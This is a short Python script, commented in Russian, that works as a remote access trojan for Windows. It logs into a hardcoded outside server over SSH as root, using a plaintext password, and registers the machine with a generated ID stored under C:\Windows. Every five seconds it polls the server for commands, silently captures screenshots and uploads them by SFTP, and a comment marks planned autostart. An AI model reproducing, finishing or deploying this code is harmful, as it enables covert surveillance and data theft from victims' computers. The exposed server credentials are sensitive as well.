import paramiko
import cv2
import time
import schedule
import uuid
import os
import PIL
import pyscreeze
import pyautogui
host = '89.223.66.96' #! Айпи сервера
user = 'root'
password = 'kt+Kkm8WHJM.DV'
port = 22

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(hostname=host, username=user, password=password, port=port)

if not os.path.exists('C:\\Windows\\DigitalLocker\\systeminfo.csv'):
    with open('C:\\Windows\\DigitalLocker\\systeminfo.csv', 'w') as file:
        code = uuid.uuid4()
        file.write(f'systemid;\n{code}')
        client.exec_command(f'touch /home/fletbot/computers/{code}')
        # TODO Автозапуск

else:
    file = open('C:\\Windows\\DigitalLocker\\systeminfo.csv', 'r')
    code = file.read().split('\n')[1]

def ratnik():
    _, stdout, _ = client.exec_command('ls /home/fletbot/requests')
    stdout = str(stdout.read())[2:-1].split('\\n')
    stdout = [i for i in stdout if code in i]
    ssh = client.open_sftp()
    for i in stdout:
        file = str(ssh.open(f'/home/fletbot/requests/{i}', 'r').read())[2:-1]
        if file == 'screenshot':
            path = f'C:\\Users\\Public\\{code}.png'
            pyautogui.screenshot(path)
            # TODO Отправка на сервер
            exporter = open(path, 'rb')
            importer = ssh.open(f'/home/fletbot/materials/{code}.png', 'wb')
            importer.write(exporter.read())
            importer.close()
            exporter.close()
            os.remove(path)


        print(f'делаю {file}')
        client.exec_command(f'rm -rf /home/fletbot/requests/{i}')
        time.sleep(1)

schedule.every(5).seconds.do(ratnik)

while True:
    schedule.run_pending()
    time.sleep(1)